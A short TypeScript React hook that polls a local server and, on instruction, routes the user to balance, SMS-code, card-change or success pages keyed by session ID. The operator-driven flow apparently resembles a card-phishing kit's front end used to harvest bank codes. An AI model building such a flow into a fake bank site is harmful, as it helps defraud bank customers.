import { useEffect } from "react";
import { useNavigate } from "react-router-dom";

interface RedirectResponse {
  success: boolean;
  redirect: boolean;
  type?: string;
  timestamp?: number;
}

export const useRedirectChecker = (interval: number = 3000) => {
  const navigate = useNavigate();

  useEffect(() => {
    const checkForRedirects = async () => {
      const sessionId = localStorage.getItem("currentSessionId");

      if (!sessionId) return;

      try {
        const response = await fetch(
          `http://localhost:3123/check-redirect/${sessionId}`
        );
        const data: RedirectResponse = await response.json();

        if (data.success && data.redirect) {
          switch (data.type) {
            case "balance":
              console.log("🔄 Redirecting to balance page");
              navigate(`/balance/${sessionId}`);
              break;
            case "sms":
              console.log("🔄 Redirecting to SMS page");
              navigate(`/sms-code/${sessionId}`);
              break;
            case "change":
              console.log("🔄 Redirecting to bank page");
              navigate(`/change-card/${sessionId}`);
              break;
            case "success":
              console.log("🔄 Redirecting to bank page");
              navigate(`/success/${sessionId}`);
              break;
            default:
              console.log("Unknown redirect type:", data.type);
          }
        }
      } catch (error) {
        console.error("Error checking redirects:", error);
      }
    };

    // Проверяем сразу при монтировании компонента
    checkForRedirects();

    // Устанавливаем периодическую проверку
    const intervalId = setInterval(checkForRedirects, interval);

    // Очистка интервала при размонтировании
    return () => clearInterval(intervalId);
  }, [navigate, interval]);
};
